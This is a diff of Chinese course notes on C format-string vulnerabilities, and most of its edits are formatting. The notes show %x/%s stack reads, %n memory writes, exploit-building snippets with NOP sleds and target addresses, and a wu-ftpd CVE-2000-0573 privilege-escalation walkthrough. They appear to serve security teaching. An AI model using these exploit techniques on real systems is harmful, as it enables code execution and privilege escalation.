@@ -1,8 +1,3 @@
----
-tags:
-  - 软件安全
-comments: true
----
 # 格式化字符串
 格式化输出：参数由一个格式字符串和可变数目的参数构成
 
@@ -118,7 +113,7 @@ int main(int argc, char * argv[]) {
 	- 如果使用星号（*）来指定宽度，则宽度将由参数列表中的一个int型的值提供
 
         ```c
-		printf("%0*d", 5, 3); // (1)
+		printf("%0*d", 5, 3); // (1)!
 		```
 
         1. 输出`00003`
@@ -129,7 +124,7 @@ int main(int argc, char * argv[]) {
 	- 如果精度域是一个星号（*），那么它的值就由参数列表中的一个int参数提供
 
         ```c
-		printf("%.*f", 3, 3.14159265); // (1)
+		printf("%.*f", 3, 3.14159265); // (1)!
 		```
 
         1. 输出 `3.142`
@@ -142,7 +137,7 @@ int main(int argc, char * argv[]) {
 
 ```c
 char buffer[512];
-sprintf(buffer,"Wrong command: %s\n",user); // (1)
+sprintf(buffer,"Wrong command: %s\n",user); // (1)!
 ```
 
 1. 当`user`大于512-16(`"Wrong command: "`)-1字节时，就会越界写
@@ -160,7 +155,7 @@ sprintf(outbuf, buffer);
 ```
 
 - 格式规范`%497d`指示函数`sprintf()`从栈中读出一个假的参数并向缓冲区中写入497个字符
-	* 现在的outbuf = "ERR Wrong command: [497 chars][more contents...]"，至`%497d`为止已经盖满了`outbuf`，再接下来马上就要改动掉返回地址
+	* 现在的outbuf = `"ERR Wrong command: [497 chars][more contents...]"`，至`%497d`为止已经盖满了`outbuf`，再接下来马上就要改动掉返回地址
 
 ### 输出流（`printf()`）
 ```c
@@ -177,18 +172,19 @@ int func(char *user) {
 === "查看栈内容"
 	* 参数以逆序压入栈中
 	* 参数在内存中出现的顺序与在`printf()`调用时出现的顺序是一致的
-	```c hl_lines="3"
-    int main(){
-        char format[32];
-       	strcpy(format,"%08x.%08x.%08x.%08x");
-       	printf(format,1,2,3);
-       	//will print "00000001.00000002.00000003.00132588"
-       	printf(format);
-       	//will print "00132588.00132580.7ffdf000.cccccccc"
-    }
-	```
+	    ```c hl_lines="3"
+        int main(){
+            char format[32];
+       	    strcpy(format,"%08x.%08x.%08x.%08x");
+       	    printf(format,1,2,3);  // (1)!
+       	    printf(format);  // (2)!
+        }
+	    ```
 
-	![](md-img/20191202_03.png)
+        1. 将输出 `00000001.00000002.00000003.00132588`
+        2. 将输出 `00132588.00132580.7ffdf000.cccccccc`
+
+	    ![](md-img/20191202_03.png)
 
 	* 紧邻参数之后的内存中包含有调用函数的自动变量，后者包括format字符数组0x2e253038的内容
 	* 随着每一个参数被相应的格式规范所耗用，参数指针的值也根据参数的长度不断递增
@@ -203,8 +199,8 @@ int func(char *user) {
 	* 还可使用`%x`使参数指针前向移动，距离仅受格式字符串的大小限制
 	* 攻击者就能够在调用函数的自动变量中插入一个地址
 		- 如果格式字符串被存储为一个自动变量，那么地址就能被插入在字符串的开始部分。
-	* 例子
-
+	
+    !!! example "示例"
         ```c hl_lines="2"
 		char format[32];
 		strcpy(format,"%08x.%08x.%08x.%s");
@@ -212,8 +208,9 @@ int func(char *user) {
 		printf(format,1,2,3);
 		//printf(format);
 		```
+
 		- `%s`可以显示内存，直到`\0`结束
-			* `\xdc\xf5\x42\x01%x%x%x%s`将显示从`0x0142f5dc`的内存直到遇到字节\0结束
+			* `\xdc\xf5\x42\x01%x%x%x%s`将显示从`0x0142f5dc`的内存直到遇到字节`\0`结束
 		- `format = "addr[%x...%x]%s"`添加若干个`%x`以“前进”到`format`所在的地址
 			* 因为`format`不一定与`&format`相邻
 
@@ -223,12 +220,12 @@ int func(char *user) {
 
         ```c hl_lines="2-3"
 		int i;
-		printf("hello%n\n",(int *)&i); //(1)
-		printf("\xdc\xf5\x42\x01%08x.%08x.%08x%n",1,2,3); //(2)
+		printf("hello%n\n",(int *)&i); //(1)!
+		printf("\xdc\xf5\x42\x01%08x.%08x.%08x%n",1,2,3); //(2)!
 		```
 
-        1. after this, i = `5`, before `%n` we have already write `5` characters(h-e-l-l-o).
-        2. after this, `[0x0142f5dc]=28(8x3+4)`
+        1. 在此之后，i = `5`，在 `%n` 之前我们已经写入了 5 个字符（`"hello"`）。
+        2. 在此之后，`[0x0142f5dc]=28(8x3+4)`
 
     * 格式化符`%u`：控制写入的字符个数（“宽度”）
 		- 每一个格式字符串都耗用两个参数：
@@ -237,8 +234,8 @@ int func(char *user) {
 
         ```c hl_lines="2-3"
 		int i;
-		printf("%10u%n",1,&i); //(1)
-		printf("%100u%n",1,&i); //(2)
+		printf("%10u%n",1,&i); //(1)!
+		printf("%100u%n",1,&i); //(2)!
 		```
 
         1. i = `10`
@@ -262,9 +259,9 @@ int func(char *user) {
 		- 利用代码
 
             ```c linenums="1" hl_lines="12 21 30 39"
-			static unsigned int already_written; //(1)
-			static unsigned int width_field; //(2)
-			static unsigned int write_byte; //(3)
+			static unsigned int already_written; //(1)!
+			static unsigned int width_field; //(2)!
+			static unsigned int write_byte; //(3)!
 			static char buffer[256];
 			already_written = 506;
 
@@ -313,8 +310,8 @@ int func(char *user) {
 			```c
 			unsigned char exploit[1024] = "\x90\x90\x90...\x90";
 			char format[1024];
-			strcpy(format, "\xaa\xaa\xaa\xaa");  //(1)
-			strcat(format, "\xdc\xf5\x42\x01");  //(2)
+			strcpy(format, "\xaa\xaa\xaa\xaa");  //(1)!
+			strcat(format, "\xdc\xf5\x42\x01");  //(2)!
 			strcat(format, "\xaa\xaa\xaa\xaa");
 			strcat(format, "\xdd\xf5\x42\x01");
 			strcat(format, "\xaa\xaa\xaa\xaa");
@@ -322,7 +319,7 @@ int func(char *user) {
 			strcat(format, "\xaa\xaa\xaa\xaa");
 			strcat(format, "\xdf\xf5\x42\x01");
 			for (i = 0; i < 61; i++) {
-			   strcat(format, "%x"); //(3)
+			   strcat(format, "%x"); //(3)!
 			}
 			/* code to write address goes here */
 			printf(format);
@@ -362,16 +359,16 @@ int func(char *user) {
             int i;
             unsigned char format_str[1024];
             strcpy(format_str, "\xaa\xaa\xaa\xaa");
-            strcat(format_str, "\xb4\x9b\x04\x08"); //(1)
+            strcat(format_str, "\xb4\x9b\x04\x08"); //(1)!
             strcat(format_str, "\xcc\xcc\xcc\xcc");
-            strcat(format_str, "\xb6\x9b\x04\x08"); //(2)
+            strcat(format_str, "\xb6\x9b\x04\x08"); //(2)!
             for (i = 0; i < 3; i++) {
                 strcat(format_str, "%x");
             }
             /* code to write address goes here */
 
             printf(format_str);
-            exit(0);        //(3)
+            exit(0);        //(3)!
         }
         ```
 
@@ -421,11 +418,11 @@ int func(char *user) {
 	int i, j, k = 0;
 
 	printf(
-		  "%4$5u%3$n%5$5u%2$n%6$5u%1$n\n",  //(1)
+		  "%4$5u%3$n%5$5u%2$n%6$5u%1$n\n",  //(1)!
 		  &k, &j, &i, 5, 6, 7
-      );          //(2)
+      );          //(2)!
 
-	printf("i = %d, j = %d, k = %d\n", i, j, k); //(3)
+	printf("i = %d, j = %d, k = %d\n", i, j, k); //(3)!
 	```
 
     1. `%4$5u` 取第四个参数（这里是常数`5`），将输出格式化为无符号的十进制整数，宽度为`5`；`%3$n` 将当前输出计数器的值（`5`）写到第三个参数(`&i`)所指定的地址；以此类推
@@ -613,7 +610,7 @@ int func(char *user) {
 	- 检查函数的参数修正值（类似于`add esp,4`）
 
 ## 漏洞实例
-* Wu-ftpd(CVE-2000-0573)
+* Wu-ftpd([CVE-2000-0573](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0573))
 	- wu-ftpd 2.6.1之前版本的`insite_exec()`函数中存在一个格式字符串漏洞
     - site exec的参数未经验证，可能导致任意命令执行，用户可能会利用命令达到权限提升的目的
 
@@ -632,18 +629,18 @@ int func(char *user) {
         user: <userid>
         password: <passwd>
         ftp> quote site exec bash -c id
-        # (1)
-        ftp> quote site exec bash -c duh # (2)
+        # (1)!
+        ftp> quote site exec bash -c duh # (2)!
         ftp> quit
         $ ./sh
-        # (3)
+        # (3)!
         ```
 
-        1. if vulnerable, 'uid=0, gid=0, euid=<yourid>, egid=<your-gids>' will be given
+        1. 如果存在漏洞，则会输出 'uid=0, gid=0, euid=<yourid>, egid=<your-gids>'
         2. 前述`duh.c`文件
         3. 原来可能不够权限运行shell，现在权限提升了，可以运行了
 
-* CDE ToolTalk(CVE-2001-0717)
+* CDE ToolTalk([CVE-2001-0717](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0717))
 	- 在所有版本的CDE ToolTalk RPC数据库服务器上都存在一个可被远程利用的格式字符串漏洞
 
 [^1]:转换规范的参考资料：https://docs.microsoft.com/zh-cn/cpp/c-runtime-library/format-specification-syntax-printf-and-wprintf-functions?view=vs-2019
